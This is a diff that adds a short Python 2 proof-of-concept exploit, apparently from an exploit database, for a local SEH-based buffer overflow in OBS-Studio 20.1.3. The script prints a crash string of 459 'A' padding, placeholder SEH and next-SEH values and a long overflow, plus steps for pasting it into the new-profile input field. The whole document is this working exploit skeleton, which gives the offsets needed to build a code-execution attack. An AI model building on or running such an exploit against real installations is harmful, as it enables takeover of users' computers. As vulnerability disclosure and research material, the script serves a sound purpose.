@@ -1,0 +1,32 @@
+author = '''
+   
+                ##############################################
+                #    Created: ScrR1pTK1dd13                  #
+                #    Name: Greg Priest                       #
+                #    Mail: ScR1pTK1dd13.slammer@gmail.com    # 
+                ##############################################
+   
+# Exploit Title: OBS-Studio-20.1.3 Local Buffer Overflow Zer0Day (SEH Based PoC)
+# Date: 2018.01.15
+# Exploit Author: Greg Priest
+# Version: OBS-Studio-20.1.3
+# Tested on: Windows7 x64 HUN/ENG Enterprise
+# Software Download Link: https://obsproject.com/download
+
+'''
+
+bug = '''
+Vulnerable input field:
+<1> Copy printed "AAAAA...." string to clipboard!
+<2> Profile -> New
+<3> Paste the string in the input then press Ok
+
+'''
+junk = "A" * 459
+SEH = "BBBB"
+nextSEH = "CCCC"
+overflow = "D" * 19533
+
+print author
+print "String: ", junk + SEH + nextSEH + overflow
+print bug
